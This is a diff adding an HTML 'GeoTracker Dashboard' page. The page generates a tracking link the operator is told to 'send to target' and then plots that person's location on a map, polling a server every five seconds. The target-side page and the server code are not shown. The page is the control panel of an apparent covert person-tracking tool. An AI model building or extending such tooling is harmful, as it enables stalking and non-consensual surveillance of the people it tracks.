@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>GeoTracker Dashboard</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css"/>
+  <style>
+    #map { height: 500px; width: 100%; }
+  </style>
+</head>
+<body>
+  <h1>GeoTracker Dashboard</h1>
+  <button onclick="generateLink()">Generate Tracking Link</button>
+  <p>Copy this link and send to target:</p>
+  <input type="text" id="trackingLink" readonly style="width:100%"/>
+  <h2>Real-Time Location</h2>
+  <div id="map"></div>
+
+  <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
+  <script>
+    let map = L.map('map').setView([0, 0], 2);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+    let marker;
+
+    function generateLink() {
+      const id = Math.random().toString(36).substring(7);
+      const link = `${location.origin}/track.html?id=${id}`;
+      document.getElementById('trackingLink').value = link;
+    }
+
+    async function fetchLocation() {
+      const res = await fetch('/api/location');
+      const data = await res.json();
+      if (data.lat && data.lon) {
+        if (!marker) {
+          marker = L.marker([data.lat, data.lon]).addTo(map);
+        } else {
+          marker.setLatLng([data.lat, data.lon]);
+        }
+        map.setView([data.lat, data.lon], 15);
+      }
+    }
+
+    setInterval(fetchLocation, 5000);
+  </script>
+</body>
+</html>
